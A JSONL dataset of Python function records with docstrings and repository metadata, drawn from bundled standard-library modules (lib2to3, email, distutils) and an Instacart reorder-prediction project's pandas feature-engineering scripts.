{"docstring": "\"\"\"Parses a block into a tree.\n\nThis is necessary to get correct line number / offset information\nin the parser diagnostics and embedded into the parse tree.\n\"\"\"\n", "func_signal": "def parse_block(self, block, lineno, indent):\n", "code": "tree = self.driver.parse_tokens(self.wrap_toks(block, lineno, indent))\ntree.future_features = frozenset()\nreturn tree", "path": "build\\pywin\\Lib\\lib2to3\\refactor.py", "repo_name": "PokemonGoF/PokemonGo-Bot-Desktop", "stars": 410, "license": "mit", "language": "python", "size": 30448}
{"docstring": "\"\"\"Writes a string to a file.\n\nIt first shows a unified diff between the old text and the new text, and\nthen rewrites the file; the latter is only done if the write option is\nset.\n\"\"\"\n", "func_signal": "def write_file(self, new_text, filename, old_text, encoding=None):\n", "code": "try:\n    f = _open_with_encoding(filename, \"w\", encoding=encoding)\nexcept os.error as err:\n    self.log_error(\"Can't create %s: %s\", filename, err)\n    return\ntry:\n    f.write(_to_system_newlines(new_text))\nexcept os.error as err:\n    self.log_error(\"Can't write %s: %s\", filename, err)\nfinally:\n    f.close()\nself.log_debug(\"Wrote changes to %s\", filename)\nself.wrote = True", "path": "build\\pywin\\Lib\\lib2to3\\refactor.py", "repo_name": "PokemonGoF/PokemonGo-Bot-Desktop", "stars": 410, "license": "mit", "language": "python", "size": 30448}
{"docstring": "\"\"\"Decode a string encoded with RFC 2045 MIME header `Q' encoding.\n\nThis function does not parse a full MIME header value encoded with\nquoted-printable (like =?iso-8895-1?q?Hello_World?=) -- please use\nthe high level email.header class for that functionality.\n\"\"\"\n", "func_signal": "def header_decode(s):\n", "code": "s = s.replace('_', ' ')\nreturn re.sub(r'=[a-fA-F0-9]{2}', _unquote_match, s)", "path": "build\\pywin\\Lib\\email\\quoprimime.py", "repo_name": "PokemonGoF/PokemonGo-Bot-Desktop", "stars": 410, "license": "mit", "language": "python", "size": 30448}
{"docstring": "\"\"\"Refactors a parse tree (modifying the tree in place).\n\nFor compatible patterns the bottom matcher module is\nused. Otherwise the tree is traversed node-to-node for\nmatches.\n\nArgs:\n    tree: a pytree.Node instance representing the root of the tree\n          to be refactored.\n    name: a human-readable name for this tree.\n\nReturns:\n    True if the tree was modified, False otherwise.\n\"\"\"\n\n", "func_signal": "def refactor_tree(self, tree, name):\n", "code": "for fixer in chain(self.pre_order, self.post_order):\n    fixer.start_tree(tree, name)\n\n#use traditional matching for the incompatible fixers\nself.traverse_by(self.bmi_pre_order_heads, tree.pre_order())\nself.traverse_by(self.bmi_post_order_heads, tree.post_order())\n\n# obtain a set of candidate nodes\nmatch_set = self.BM.run(tree.leaves())\n\nwhile any(match_set.values()):\n    for fixer in self.BM.fixers:\n        if fixer in match_set and match_set[fixer]:\n            #sort by depth; apply fixers from bottom(of the AST) to top\n            match_set[fixer].sort(key=pytree.Base.depth, reverse=True)\n\n            if fixer.keep_line_order:\n                #some fixers(eg fix_imports) must be applied\n                #with the original file's line order\n                match_set[fixer].sort(key=pytree.Base.get_lineno)\n\n            for node in list(match_set[fixer]):\n                if node in match_set[fixer]:\n                    match_set[fixer].remove(node)\n\n                try:\n                    find_root(node)\n                except ValueError:\n                    # this node has been cut off from a\n                    # previous transformation ; skip\n                    continue\n\n                if node.fixers_applied and fixer in node.fixers_applied:\n                    # do not apply the same fixer again\n                    continue\n\n                results = fixer.match(node)\n\n                if results:\n                    new = fixer.transform(node, results)\n                    if new is not None:\n                        node.replace(new)\n                        #new.fixers_applied.append(fixer)\n                        for node in new.post_order():\n                            # do not apply the fixer again to\n                            # this or any subnode\n                            if not node.fixers_applied:\n                                node.fixers_applied = []\n                            node.fixers_applied.append(fixer)\n\n                        # update the original match set for\n                        # the added code\n                        new_matches = self.BM.run(new.leaves())\n                        for fxr in new_matches:\n                            if not fxr in match_set:\n                                match_set[fxr]=[]\n\n                            match_set[fxr].extend(new_matches[fxr])\n\nfor fixer in chain(self.pre_order, self.post_order):\n    fixer.finish_tree(tree, name)\nreturn tree.was_changed", "path": "build\\pywin\\Lib\\lib2to3\\refactor.py", "repo_name": "PokemonGoF/PokemonGo-Bot-Desktop", "stars": 410, "license": "mit", "language": "python", "size": 30448}
{"docstring": "\"\"\"Refactors a docstring, looking for doctests.\n\nThis returns a modified version of the input string.  It looks\nfor doctests, which start with a \">>>\" prompt, and may be\ncontinued with \"...\" prompts, as long as the \"...\" is indented\nthe same as the \">>>\".\n\n(Unfortunately we can't use the doctest module's parser,\nsince, like most parsers, it is not geared towards preserving\nthe original source.)\n\"\"\"\n", "func_signal": "def refactor_docstring(self, input, filename):\n", "code": "result = []\nblock = None\nblock_lineno = None\nindent = None\nlineno = 0\nfor line in input.splitlines(True):\n    lineno += 1\n    if line.lstrip().startswith(self.PS1):\n        if block is not None:\n            result.extend(self.refactor_doctest(block, block_lineno,\n                                                indent, filename))\n        block_lineno = lineno\n        block = [line]\n        i = line.find(self.PS1)\n        indent = line[:i]\n    elif (indent is not None and\n          (line.startswith(indent + self.PS2) or\n           line == indent + self.PS2.rstrip() + u\"\\n\")):\n        block.append(line)\n    else:\n        if block is not None:\n            result.extend(self.refactor_doctest(block, block_lineno,\n                                                indent, filename))\n        block = None\n        indent = None\n        result.append(line)\nif block is not None:\n    result.extend(self.refactor_doctest(block, block_lineno,\n                                        indent, filename))\nreturn u\"\".join(result)", "path": "build\\pywin\\Lib\\lib2to3\\refactor.py", "repo_name": "PokemonGoF/PokemonGo-Bot-Desktop", "stars": 410, "license": "mit", "language": "python", "size": 30448}
{"docstring": "\"\"\"Returns a gid, given a group name.\"\"\"\n", "func_signal": "def _get_gid(name):\n", "code": "if getgrnam is None or name is None:\n    return None\ntry:\n    result = getgrnam(name)\nexcept KeyError:\n    result = None\nif result is not None:\n    return result[2]\nreturn None", "path": "build\\pywin\\Lib\\distutils\\archive_util.py", "repo_name": "PokemonGoF/PokemonGo-Bot-Desktop", "stars": 410, "license": "mit", "language": "python", "size": 30448}
{"docstring": "\"\"\"\npath = '../output/mydf'\n\nwirte '../output/mydf/0.p'\n      '../output/mydf/1.p'\n      '../output/mydf/2.p'\n\n\"\"\"\n", "func_signal": "def to_pickles(df, path, split_size=3, inplace=True):\n", "code": "if inplace==True:\n    df.reset_index(drop=True, inplace=True)\nelse:\n    df = df.reset_index(drop=True)\ngc.collect()\nmkdir_p(path)\n\nkf = KFold(n_splits=split_size)\nfor i, (train_index, val_index) in enumerate(tqdm(kf.split(df))):\n    df.iloc[val_index].to_pickle(f'{path}/{i:03d}.p')\nreturn", "path": "py_model\\utils.py", "repo_name": "KazukiOnodera/Instacart", "stars": 284, "license": "mit", "language": "python", "size": 4687}
{"docstring": "\"\"\"\nT = 0\nfolder = 'trainT-0'\n\"\"\"\n", "func_signal": "def make(T):\n", "code": "if T==-1:\n    folder = 'test'\nelse:\n    folder = 'trainT-'+str(T)\n    \nlog_ = log[log.order_number_rev>T]\nlog_['onb_max'] = log_.groupby('user_id').order_number.transform(np.max)\n\nr1_d10 = []\nr1_d2 = []\nr1_df2 = []\nr0_d10 = []\nr0_d2 = []\nr0_df2 = []\n\nseq = []\nuid_bk = pid_bk = onb_max_bk = None\nfor uid,pid,onb,onb_max in tqdm(log_[['user_id', 'product_id', 'order_number', 'onb_max']].values):\n    \n    if uid_bk is None:\n        pass\n    \n    elif uid==uid_bk and pid==pid_bk:\n        pass\n    \n    elif uid!=uid_bk or pid!=pid_bk:\n        r1_d10.append(conv_bi2dec(seq, onb_max_bk, True,  10))\n        r1_d2.append(conv_bi2dec(seq, onb_max_bk,  True,  2))\n        r1_df2.append(conv_bi2dec(seq, onb_max_bk, False, .2))\n        r0_d10.append(conv_bi2dec(seq, onb_max_bk, True,  10))\n        r0_d2.append(conv_bi2dec(seq, onb_max_bk,  True,  2))\n        r0_df2.append(conv_bi2dec(seq, onb_max_bk, False, .2))\n        seq = []\n        \n    seq.append(onb)\n    uid_bk = uid\n    pid_bk = pid\n    onb_max_bk = onb_max\n\nr1_d10.append(conv_bi2dec(seq, onb_max_bk, True,  10))\nr1_d2.append(conv_bi2dec(seq, onb_max_bk,  True,  2))\nr1_df2.append(conv_bi2dec(seq, onb_max_bk, False, .2))\nr0_d10.append(conv_bi2dec(seq, onb_max_bk, True,  10))\nr0_d2.append(conv_bi2dec(seq, onb_max_bk,  True,  2))\nr0_df2.append(conv_bi2dec(seq, onb_max_bk, False, .2))\n\ndf = log_[['user_id', 'product_id']].drop_duplicates(keep='first').reset_index(drop=True)\ndf['seq2dec_r1_d10'] = r1_d10\ndf['seq2dec_r1_d2']  = r1_d2\ndf['seq2dec_r1_df2'] = r1_df2\ndf['seq2dec_r0_d10'] = r0_d10\ndf['seq2dec_r0_d2']  = r0_d2\ndf['seq2dec_r0_df2'] = r0_df2\n\ndf.to_pickle('../feature/{}/f317_user-product.p'.format(folder))", "path": "appendix\\317_.py", "repo_name": "KazukiOnodera/Instacart", "stars": 284, "license": "mit", "language": "python", "size": 4687}
{"docstring": "\"\"\"\nvec is np.array\n\"\"\"\n\n", "func_signal": "def vec2pids(uid, vec, topn=100):\n", "code": "sim_items = model.similar_by_vector(vec, topn=topn)\npnames = user_order.loc[user_order.user_id==uid, 'product_name'].values[0]\n\npnames = [i for i,v in sim_items if i in pnames]\n\nreturn pnames2ids(pnames)", "path": "py_model\\utils.py", "repo_name": "KazukiOnodera/Instacart", "stars": 284, "license": "mit", "language": "python", "size": 4687}
{"docstring": "\"\"\"\nT = 0\nfolder = 'trainT-0'\n\"\"\"\n", "func_signal": "def make(T):\n", "code": "if T==-1:\n    folder = 'test'\nelse:\n    folder = 'trainT-'+str(T)\nprint(\"start T:{} folder:{}\".format(T, folder))\norder_tbl_ = order_tbl[order_tbl.order_number_rev>T].dropna() # drop first order\n\nitem2item = []\nitem_bunbo = Counter()\nfor item_prior, item_now in order_tbl_[['t-1_product_name', 'product_name']].values:\n    item2item  += [i1+' -> '+i2 for i1, i2 in list(product(item_prior, item_now))]\n    item_bunbo += Counter(item_prior)\nitem2item = Counter(item2item)\n\ndf = pd.DataFrame.from_dict(item2item, orient='index').reset_index()\ndf.columns = ['item', 'cnt']\ndel item2item; gc.collect()\n\ndf_ = pd.DataFrame.from_dict(item_bunbo, orient='index').reset_index()\ndf_.columns = ['before', 'total_cnt']\ndel item_bunbo; gc.collect()\n\ndf.sort_values('cnt', ascending=False, inplace=True)\n\ndf['before'] = df.item.map(lambda x: x.split(' -> ')[0])\ndf['after'] = df.item.map(lambda x: x.split(' -> ')[1])\ndf = df[df.before!=df.after]\n\ndf = pd.merge(df, df_, on='before', how='left')\n\ndf['before_to_after_ratio'] = df.cnt / df.total_cnt\ndf = df[['before', 'after', 'before_to_after_ratio']]\ngc.collect()\n\ndf = pd.merge(df, prods.rename(columns={'product_name':'before', 'product_id':'before_id'}), \n               on='before', how='left')\ndf = pd.merge(df, prods.rename(columns={'product_name':'after', 'product_id':'after_id'}), \n               on='after', how='left')\n\ndf = df[['before_id', 'after_id', 'before_to_after_ratio']]\ngc.collect()\n\"\"\"\ndf.head()\n      before_id  after_id  before_to_after_ratio\n0      47209     13176               0.288618\n1      13176     47209               0.175736\n2      13176     21137               0.148974\n3      21137     13176               0.188769\n\"\"\"\n#==============================================================================\nprint('Merge', T)\n#==============================================================================\nlabel = pd.read_pickle('../feature/{}/label_reordered.p'.format(folder))\nlabel = pd.merge(label, order_tbl[['order_id', 't-1_order_id']], \n                 on='order_id', how='left')\nprint('\u4eca\u307e\u3067\u8cb7\u3063\u305fitem and t-1\u306b\u8cb7\u3063\u305fitem')\norder_b4after = pd.merge(label, order_item_array.add_prefix('t-1_'), \n                         on='t-1_order_id', how='left')\ngc.collect()\n\ncol = ['order_id', 't-1_product_id', 'product_id']\norder_b4after = order_b4after[col]\ngc.collect()\n\"\"\"\norder_b4after.head()\nOut[9]:\n   order_id                                     t-1_product_id  product_id\n0   1187899  [46149, 39657, 38928, 25133, 10258, 35951, 130...         196\n1   1187899  [46149, 39657, 38928, 25133, 10258, 35951, 130...       10258\n2   1187899  [46149, 39657, 38928, 25133, 10258, 35951, 130...       10326\n3   1187899  [46149, 39657, 38928, 25133, 10258, 35951, 130...       12427\n4   1187899  [46149, 39657, 38928, 25133, 10258, 35951, 130...       13032\n\"\"\"\n#==============================================================================\nprint('search max ratio',T)\n#==============================================================================\ndf['key'] = df.before_id.map(str) + 'to' + df.after_id.map(str)\n\nratio_tbl = {}\nfor k,v in df[['key','before_to_after_ratio']].values:\n    ratio_tbl[k] = v\n\ndel df; gc.collect()\n\ndef get_ratio(key):\n    try:\n        return ratio_tbl[key]\n    except:\n        return -1\n\ndef search_max_ratio(before_items, item):\n    \"\"\"\n    before_items = order_tr.loc[0,'t-1_product_id']\n    item    = order_tr.loc[0,'product_id']    \n    \"\"\"\n    comb = list(product(before_items, [item]))\n    comb = [str(x) + 'to' + str(y) for x,y in sorted(comb, key=itemgetter(1))]\n    return np.max([get_ratio(k) for k in comb])\n\n\nprint('== before_to_after_ratio ==', T)\nret = []\nfor before_items, item in order_b4after[['t-1_product_id', 'product_id']].values:\n    ret.append(search_max_ratio(before_items, item))\norder_b4after['before_to_after_ratio'] = ret\n\ncol = ['order_id', 'product_id', 'before_to_after_ratio']\norder_b4after[col].to_pickle('../feature/{}/f205_order_product.p'.format(folder))", "path": "py_feature\\205_co-occur.py", "repo_name": "KazukiOnodera/Instacart", "stars": 284, "license": "mit", "language": "python", "size": 4687}
{"docstring": "\"\"\"\nT = 0\nfolder = 'trainT-0'\n\"\"\"\n", "func_signal": "def make(T):\n", "code": "if T==-1:\n    folder = 'test'\nelse:\n    folder = 'trainT-'+str(T)\n\norder_tbl_ = order_tbl[order_tbl.order_number_rev>T]\n\npid_cnt    = defaultdict(int)\npid_chance = defaultdict(int)", "path": "py_feature\\011_replacement.py", "repo_name": "KazukiOnodera/Instacart", "stars": 284, "license": "mit", "language": "python", "size": 4687}
{"docstring": "\"\"\"\nT = 0\nfolder = 'trainT-0'\n\"\"\"\n", "func_signal": "def make(T):\n", "code": "if T==-1:\n    folder = 'test'\nelse:\n    folder = 'trainT-'+str(T)\n    \nlog_ = log[log.order_number_rev>T]\n\ncnt = log_.groupby(['user_id', 'product_id', 'timezone']).size()\ncnt.name = 'useritem_buy_timezone_cnt'\ncnt = cnt.reset_index()\n\nsum_ = log_.groupby(['user_id', 'product_id']).size()\nsum_.name = 'total'\nsum_ = sum_.reset_index()\n\ndf = pd.merge(cnt, sum_, on=['user_id', 'product_id'], how='left')\n\ndf['useritem_buy_timezone_ratio'] = df.useritem_buy_timezone_cnt / df.total\n\ncol = ['user_id', 'product_id', 'timezone', \n       'useritem_buy_timezone_cnt', 'useritem_buy_timezone_ratio']\n\ndf[col].to_pickle('../feature/{}/f307_user-product-timezone.p'.format(folder))\n\n#==============================================================================\n\n\ncnt = log_.groupby(['user_id', 'product_id', 'order_dow']).size()\ncnt.name = 'useritem_buy_dow_cnt'\ncnt = cnt.reset_index()\n\nsum_ = log_.groupby(['user_id', 'product_id']).size()\nsum_.name = 'total'\nsum_ = sum_.reset_index()\n\ndf = pd.merge(cnt, sum_, on=['user_id', 'product_id'], how='left')\n\ndf['useritem_buy_dow_ratio'] = df.useritem_buy_dow_cnt / df.total\n\ncol = ['user_id', 'product_id', 'order_dow', \n       'useritem_buy_dow_cnt', 'useritem_buy_dow_ratio']\n\ndf[col].to_pickle('../feature/{}/f307_user-product-dow.p'.format(folder))", "path": "py_feature\\307_timezone_dow.py", "repo_name": "KazukiOnodera/Instacart", "stars": 284, "license": "mit", "language": "python", "size": 4687}
{"docstring": "\"\"\"\nT = 0\nfolder = 'trainT-0'\n\"\"\"\n", "func_signal": "def make(T):\n", "code": "if T==-1:\n    folder = 'test'\nelse:\n    folder = 'trainT-'+str(T)\n\nlog_ = log[log.order_number_rev>T]\n\nall_item_dist = log_.order_dow.value_counts(normalize=True).reset_index()\nall_item_dist.columns = ['order_dow', 'dow_dist_ratio']\n\ntbl = log_.groupby(['product_id', 'order_dow']).size().reset_index()\ntbl.columns = ['product_id', 'order_dow', 'item_dow_cnt']\ntbl['item_dow_ratio'] = tbl.item_dow_cnt / tbl.groupby('product_id').transform(np.sum).item_dow_cnt\n\ntbl = pd.merge(tbl, all_item_dist, on='order_dow', how='left')\n\ntbl['item_dow_ratio_diff'] = tbl.item_dow_ratio - tbl.dow_dist_ratio\n\ntbl[['product_id','order_dow', 'item_dow_ratio_diff']].to_pickle('../feature/{}/f213_product-dow.p'.format(folder))", "path": "py_feature\\213_dow_diff.py", "repo_name": "KazukiOnodera/Instacart", "stars": 284, "license": "mit", "language": "python", "size": 4687}
{"docstring": "\"\"\"\nT = 0\nfolder = 'trainT-0'\n\"\"\"\n", "func_signal": "def make(T):\n", "code": "if T==-1:\n    folder = 'test'\nelse:\n    folder = 'trainT-'+str(T)\n    \nlabel = pd.read_pickle('../feature/{}/label_reordered.p'.format(folder))\nlabel = pd.merge(label, X_base, on='order_id', how='left') # TODO: change to inner\n\n# ======== T-1~3 ========\nfor t in range(1,4):\n    col = ['order_id', 'product_id', 'buy_item_inarow']\n    df = pd.merge(label, log[col].rename(columns={'order_id':'t-{}_order_id'.format(t)}),\n                  on=['t-{}_order_id'.format(t),'product_id'], how='left')\n    \n    col = ['order_id', 'order_number']\n    df = pd.merge(df, log[col].rename(columns={'order_id':'t-{}_order_id'.format(t)}).drop_duplicates(),\n                  on=['t-{}_order_id'.format(t)], how='left')\n    \n    df['buy_item_inarow_ratio'] = df['buy_item_inarow']/df['order_number']\n    df = df.rename(columns={'buy_item_inarow':'t-{}_buy_item_inarow'.format(t),\n                            'buy_item_inarow_ratio':'t-{}_buy_item_inarow_ratio'.format(t)})\n    print(df.isnull().sum())\n    df.fillna(0, inplace=1)\n    df.reset_index(drop=1, inplace=1)\n    \n    col = ['order_id', 'product_id', 't-{}_buy_item_inarow'.format(t),'t-{}_buy_item_inarow_ratio'.format(t)]\n    df[col].to_pickle('../feature/{}/f304-{}_order-product.p'.format(folder, t))", "path": "py_feature\\304_buy_item_inarow.py", "repo_name": "KazukiOnodera/Instacart", "stars": 284, "license": "mit", "language": "python", "size": 4687}
{"docstring": "\"\"\"\npath = '../output/mydf'\n\nwirte '../output/mydf/0.p'\n      '../output/mydf/1.p'\n      '../output/mydf/2.p'\n\n\"\"\"\n", "func_signal": "def to_pickles(df, path, split_size=3, inplace=True):\n", "code": "if inplace==True:\n    df.reset_index(drop=True, inplace=True)\nelse:\n    df = df.reset_index(drop=True)\ngc.collect()\nmkdir_p(path)\n\nkf = KFold(n_splits=split_size)\nfor i, (train_index, val_index) in enumerate(tqdm(kf.split(df))):\n    df.iloc[val_index].to_pickle(f'{path}/{i:03d}.p')\nreturn", "path": "py_feature\\utils.py", "repo_name": "KazukiOnodera/Instacart", "stars": 284, "license": "mit", "language": "python", "size": 4687}
{"docstring": "\"\"\"\nT = 0\nfolder = 'trainT-0'\n\"\"\"\n", "func_signal": "def make(T):\n", "code": "if T==-1:\n    folder = 'test'\nelse:\n    folder = 'trainT-'+str(T)\n    \nlog_ = log[log.order_number_rev>T]\n\nuid_pid = {}\nuid_bk = pid_bk = onb_bk = None\ncol = ['user_id', 'product_id', 'order_number', 'days_since_prior_order']\n\nfor uid,pid,onb,days in log_[col].values:\n#    uid = str(uid)\n#    pid = str(pid)\n    if uid_bk is None:\n        pass\n    elif uid+'@'+pid in uid_pid:\n        continue\n    elif days == 0 and uid == uid_bk and pid == pid_bk and onb-onb_bk==1:\n        uid_pid[uid+'@'+pid] = 1\n        \n    uid_bk = uid\n    pid_bk = pid\n    onb_bk = onb\n\ndf = pd.DataFrame().from_dict(uid_pid, orient='index').reset_index()\ndf.columns = ['uidpid', 'buy_within_sameday']\ndf['user_id'] = df.uidpid.map(lambda x:x.split('@')[0])\ndf['product_id'] = df.uidpid.map(lambda x:x.split('@')[1])\n\ndf = df[['user_id', 'product_id', 'buy_within_sameday']]\nfor c in df.columns:\n    df[c] = df[c].map(int)\ndf.sort_values(df.columns.tolist(), inplace=True)\ndf.reset_index(drop=1, inplace=1)\n\ndf.to_pickle('../feature/{}/f310_user-product.p'.format(folder))", "path": "py_feature\\310_repeat_within_today.py", "repo_name": "KazukiOnodera/Instacart", "stars": 284, "license": "mit", "language": "python", "size": 4687}
{"docstring": "\"\"\"\nT = 0\nfolder = 'trainT-0'\n\"\"\"\n\n", "func_signal": "def make(T):\n", "code": "if T==-1:\n    folder = 'test'\nelse:\n    folder = 'trainT-'+str(T)\n    \nlog_ = log[log.order_number_rev>T]\n\nuser = log_.drop_duplicates('user_id')[['user_id']].reset_index(drop=True)\n\n# have you bought -> hyb\ntag_user = log_[log_.product_id==24852].user_id\nuser['hyb_Banana'] = 0\nuser.loc[user.user_id.isin(tag_user), 'hyb_Banana'] = 1\n\ntag_user = log_[log_.product_id==13176].user_id\nuser['hyb_BoO-Bananas'] = 0\nuser.loc[user.user_id.isin(tag_user), 'hyb_BoO-Bananas'] = 1\n\ntag_user = log_[log_.product_id==21137].user_id\nuser['hyb_Organic-Strawberries'] = 0\nuser.loc[user.user_id.isin(tag_user), 'hyb_Organic-Strawberries'] = 1\n\ntag_user = log_[log_.product_id==21903].user_id\nuser['hyb_Organic-Baby-Spinach'] = 0\nuser.loc[user.user_id.isin(tag_user), 'hyb_Organic-Baby-Spinach'] = 1\n\ntag_user = log_[log_.product_id==47209].user_id\nuser['hyb_Organic-Hass-Avocado'] = 0\nuser.loc[user.user_id.isin(tag_user), 'hyb_Organic-Hass-Avocado'] = 1\n\nuser.to_pickle('../feature/{}/f109_user.p'.format(folder))", "path": "py_feature\\109_have_you_bought.py", "repo_name": "KazukiOnodera/Instacart", "stars": 284, "license": "mit", "language": "python", "size": 4687}
{"docstring": "\"\"\"\nitems: item list\n\"\"\"\n", "func_signal": "def items2vec(model, items, default=200):\n", "code": "try:\n    items = valid_words(model, items)\n    if len(items)==0:\n        raise\n    vec   = [model[w] for w in items]\n    return np.array(vec).mean(axis=0)\nexcept:\n    return np.ones(default)*-1", "path": "py_model\\utils.py", "repo_name": "KazukiOnodera/Instacart", "stars": 284, "license": "mit", "language": "python", "size": 4687}
{"docstring": "\"\"\"\nT = 0\nfolder = 'trainT-0'\n\"\"\"\n", "func_signal": "def make(T):\n", "code": "if T==-1:\n    folder = 'test'\nelse:\n    folder = 'trainT-'+str(T)\n\nlog_ = log[log.order_number_rev>T]\n\ngr = log_.groupby('product_id')\n\nitems = gr.add_to_cart_order.mean().to_frame()\nitems.columns = ['item_mean_pos_cart']\nitems['item_sum_pos_cart'] = gr.add_to_cart_order.sum()\nitems['item_min_pos_cart'] = gr.add_to_cart_order.min()\nitems['item_median_pos_cart'] = gr.add_to_cart_order.median()\nitems['item_max_pos_cart'] = gr.add_to_cart_order.max()\nitems['item_std_pos_cart'] = gr.add_to_cart_order.std()\nitems.reset_index(inplace=True)\n\nitems.to_pickle('../feature/{}/f207_product.p'.format(folder))", "path": "py_feature\\207_mean_pos_cart.py", "repo_name": "KazukiOnodera/Instacart", "stars": 284, "license": "mit", "language": "python", "size": 4687}
{"docstring": "\"\"\"\nT = 0\nfolder = 'trainT-0'\n\"\"\"\n", "func_signal": "def make(T):\n", "code": "if T==-1:\n    folder = 'test'\nelse:\n    folder = 'trainT-'+str(T)\n\nglobal log_\nlog_ = log[log.order_number_rev>T]\n\nuser_id = log_.user_id.unique()\nmp_pool = mp.Pool(total_proc)\ncallback = mp_pool.map(multi, user_id)\ncallback = pd.concat(callback)\ngc.collect()\n\ngr = callback.groupby('product_id')\n\ndf = gr['item_1to1_cnt'].sum().to_frame()\ndf.columns = ['item_1to1_cnt']\ndf['item_1to1_chance'] = gr['item_1to1_chance'].sum()\n\ncol = ['11to1', '10to1', '111to1', '110to1', '101to1', '100to1']\nfor c in col:\n    c_cnt    = 'item_{}_cnt'.format(c)\n    c_chance = 'item_{}_chance'.format(c)\n    df[c_cnt]    = gr[c_cnt].sum()\n    df[c_chance] = gr[c_chance].sum()\n\ncol = ['1to1', '11to1', '10to1', '111to1', '110to1', '101to1', '100to1']\nfor c in col:\n    c_cnt    = 'item_{}_cnt'.format(c)\n    c_chance = 'item_{}_chance'.format(c)\n    df['item_{}_ratio'.format(c)] = df[c_cnt]/df[c_chance]\n\ndf.fillna(0, inplace=True)\ndf.reset_index(inplace=True)\nprint('writing 211 T:',T)\ndf.to_pickle('../feature/{}/f211_product.p'.format(folder))", "path": "py_feature\\211_1to1.py", "repo_name": "KazukiOnodera/Instacart", "stars": 284, "license": "mit", "language": "python", "size": 4687}
{"docstring": "#==============================================================================\n# hour\n#==============================================================================\n", "func_signal": "def make(log, folder):\n", "code": "gc.collect()\ntbl = log.groupby(['product_id', 'order_hour_of_day']).size().reset_index()\ntbl.columns = ['product_id', 'order_hour_of_day', 'item_hour_cnt']\n\ntbl['item_hour_ratio'] = tbl.item_hour_cnt / tbl.groupby('product_id').transform(np.sum).item_hour_cnt\n\ntbl.to_pickle('../feature/{}/f202_product_hour.p'.format(folder))\n\n# unique\ntbl = log.drop_duplicates(['user_id', 'product_id', 'order_hour_of_day']).groupby(['product_id', 'order_hour_of_day']).size().reset_index()\ntbl.columns = ['product_id', 'order_hour_of_day', 'item_hour_cnt_unq']\n\ntbl['item_hour_ratio_unq'] = tbl.item_hour_cnt_unq / tbl.groupby('product_id').transform(np.sum).item_hour_cnt_unq\n\ntbl.to_pickle('../feature/{}/f202_uniq_product_hour.p'.format(folder))\n\n\n#==============================================================================\n# dow\n#==============================================================================\ngc.collect()\ntbl = log.groupby(['product_id', 'order_dow']).size().reset_index()\ntbl.columns = ['product_id', 'order_dow', 'item_dow_cnt']\n\ntbl['item_dow_ratio'] = tbl.item_dow_cnt / tbl.groupby('product_id').transform(np.sum).item_dow_cnt\n\ntbl.to_pickle('../feature/{}/f202_product_dow.p'.format(folder))\n\n# unique\ntbl = log.drop_duplicates(['user_id', 'product_id', 'order_dow']).groupby(['product_id', 'order_dow']).size().reset_index()\ntbl.columns = ['product_id', 'order_dow', 'item_dow_cnt_unq']\n\ntbl['item_dow_ratio_unq'] = tbl.item_dow_cnt_unq / tbl.groupby('product_id').transform(np.sum).item_dow_cnt_unq\n\ntbl.to_pickle('../feature/{}/f202_uniq_product_dow.p'.format(folder))\n\n\n#==============================================================================\n# timezone\n#==============================================================================\ngc.collect()\ntbl = log.groupby(['product_id', 'timezone']).size().reset_index()\ntbl.columns = ['product_id', 'timezone', 'item_timezone_cnt']\n\ntbl['item_timezone_ratio'] = (tbl.item_timezone_cnt / tbl.groupby('product_id').transform(np.sum).item_timezone_cnt).map(float)\n\ntbl.to_pickle('../feature/{}/f202_product_timezone.p'.format(folder))\n\n# unique\ntbl = log.drop_duplicates(['user_id', 'product_id', 'timezone']).groupby(['product_id', 'timezone']).size().reset_index()\ntbl.columns = ['product_id', 'timezone', 'item_timezone_cnt_uniq']\n\ntbl['item_timezone_ratio_uniq'] = (tbl.item_timezone_cnt_uniq / tbl.groupby('product_id').transform(np.sum).item_timezone_cnt_uniq).map(float)\n\ntbl.to_pickle('../feature/{}/f202_uniq_product_timezone.p'.format(folder))\n\n#==============================================================================\n# timezone * dow\n#==============================================================================\ngc.collect()\n\ntbl = log.groupby(['product_id', 'order_dow', 'timezone']).size().reset_index()\ntbl.columns = ['product_id', 'order_dow', 'timezone', 'item_dow-tz_cnt']\n\ntbl['item_dow-tz_ratio'] = (tbl['item_dow-tz_cnt'] / tbl.groupby('product_id').transform(np.sum)['item_dow-tz_cnt']).map(float)\n\ntbl.to_pickle('../feature/{}/f202_product_dow-timezone.p'.format(folder))\n\n# unique\ntbl = log.drop_duplicates(['user_id', 'product_id', 'order_dow', 'timezone']).groupby(['product_id', 'order_dow', 'timezone']).size().reset_index()\ntbl.columns = ['product_id', 'order_dow', 'timezone', 'item_dow-tz_cnt_uniq']\n\ntbl['item_dow-tz_ratio_uniq'] = (tbl['item_dow-tz_cnt_uniq'] / tbl.groupby('product_id').transform(np.sum)['item_dow-tz_cnt_uniq']).map(float)\n\ntbl.to_pickle('../feature/{}/f202_uniq_product_dow-timezone.p'.format(folder))\n\n\n#==============================================================================\n# flat\n#==============================================================================\ngc.collect()\ntbl = pd.crosstab(log.product_id, log.dow_tz, normalize='index').add_prefix('item_flat_dow-tz_')\n\ntbl.reset_index().to_pickle('../feature/{}/f202_flat_product.p'.format(folder))", "path": "py_feature\\202_buy_time.py", "repo_name": "KazukiOnodera/Instacart", "stars": 284, "license": "mit", "language": "python", "size": 4687}
{"docstring": "\"\"\"\nkey: str\n\"\"\"\n", "func_signal": "def compress(df, key):\n", "code": "df_ = df.drop_duplicates(key)[[key]].set_index(key)\ndtypes = df.dtypes\ncol = dtypes[dtypes!='O'].index\ncol = [c for c in col if '_id' not in c]\ngr = df.groupby(key)\nfor c in col:\n    df_[c+'-min'] = gr[c].min()\n    df_[c+'-mean'] = gr[c].mean()\n    df_[c+'-median'] = gr[c].median()\n    df_[c+'-max'] = gr[c].max()\n    df_[c+'-std'] = gr[c].std()\n    \nvar = df_.var()\ncol = var[var==0].index\ndf_.drop(col, axis=1, inplace=True)\ngc.collect()\n\nreturn df_.reset_index()", "path": "py_feature\\501_concat.py", "repo_name": "KazukiOnodera/Instacart", "stars": 284, "license": "mit", "language": "python", "size": 4687}
